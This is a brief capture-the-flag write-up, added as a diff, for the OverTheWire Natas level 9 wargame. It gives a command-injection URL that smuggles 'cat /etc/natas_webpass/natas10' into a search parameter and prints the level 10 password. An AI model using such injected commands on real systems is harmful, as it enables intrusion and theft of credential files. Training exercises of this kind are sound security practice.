@@ -1,0 +1,8 @@
+Task:
+    We look at the script and realize that it is vulnerable to an injection. Like, they have a straight "exec" with no validation
+
+Solution:
+    Inject using the following url: http://natas9.natas.labs.overthewire.org/?needle=a;cat%20/etc/natas_webpass/natas10;&submit=Search
+
+Password: 
+    natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
